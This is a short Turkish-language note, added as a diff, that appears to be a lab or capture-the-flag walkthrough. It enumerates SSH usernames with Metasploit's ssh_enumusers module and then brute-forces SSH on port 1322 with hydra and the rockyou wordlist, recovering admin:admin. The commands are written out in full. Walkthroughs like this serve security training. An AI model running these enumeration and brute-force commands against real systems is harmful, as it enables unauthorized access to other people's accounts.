@@ -1,0 +1,20 @@
+ssh kısmında typhoon makinesindeki gibi bir username kısmına bir brute force yapacağız bunun için msfconsole üzerinden search ssh d,yerek sonuçları listeliyorum 
+
+100  auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration
+
+bu modülü use 100 diyerek seçiyorum ardından options diyerek ayarlara giriyorum 
+
+RHOSTS --> <ip> 
+USER_FILE --> /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+
+ayarları bu şekilde ayarladıktan sonra run diyerek başlatıyoruz ve 3 kullanıcı ismi buluyor 
+
+admin
+user
+root
+
+şimdi bunlarla brute force atak yapacağız bunun için hydra toolunu kullanacağım  bu kullanıcı adlarını bir dosaya yazıp isminu user_file koyup şu komutu çalıştıracağız
+
+hydra <ip> ssh -s 1322 -L user_file -P /usr/share/wordlists/rockyou.txt
+
+ve bize admin:admin kullanıcısını buluyor bu sayede hiçbir usernma ve password bilemdedn hem passwordu hemde username baştan öğrenmiş olduk 
